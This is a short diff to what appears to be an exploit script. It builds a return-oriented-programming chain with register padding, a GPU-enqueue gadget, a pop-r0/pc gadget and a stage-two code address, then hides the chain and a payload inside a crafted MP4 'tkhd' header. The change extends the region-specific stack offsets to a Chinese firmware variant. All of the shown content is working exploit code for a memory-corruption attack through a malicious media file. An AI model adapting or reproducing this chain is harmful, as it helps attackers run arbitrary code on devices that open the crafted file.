@@ -130,7 +130,7 @@ rop += "bbbb" # r4
 rop += "cccc" # r5
 rop += "dddd" # r6
 rop += p(gpu_enqueue_gadget)
-if REGION != 'kor':
+if (REGION != 'kor') and (REGION != 'chn'):
     rop += "aaaa" # skipped
 rop += p(4)
 rop += p(payload_heap_addr)
@@ -140,7 +140,7 @@ rop += p(0)
 rop += p(0)
 rop += p(8)
 rop += p(0)
-if REGION == 'kor':
+if (REGION == 'kor') or (REGION == 'chn'):
     rop += "aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
 rop += "AAAA" # r4
 rop += "AAAA" # r5
@@ -148,7 +148,7 @@ rop += "AAAA" # r6
 rop += "AAAA" # r7
 rop += "AAAA" # r8
 rop += "AAAA" # r9
-if REGION != 'kor':
+if (REGION != 'kor') and (REGION != 'chn'):
     rop += "AAAA" # r10
     rop += "AAAA" # r11
 rop += p(pop_r0_pc) # pc
@@ -163,7 +163,7 @@ rop += p(stage2_code_va)
 rop += payload
 
 tkhd_data = 'A'*136 # padding
-if REGION != 'kor':
+if (REGION != 'kor') and (REGION != 'chn'):
     tkhd_data += 'A'*0x28 # padding
 tkhd_data += rop # ROP starts here
 tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
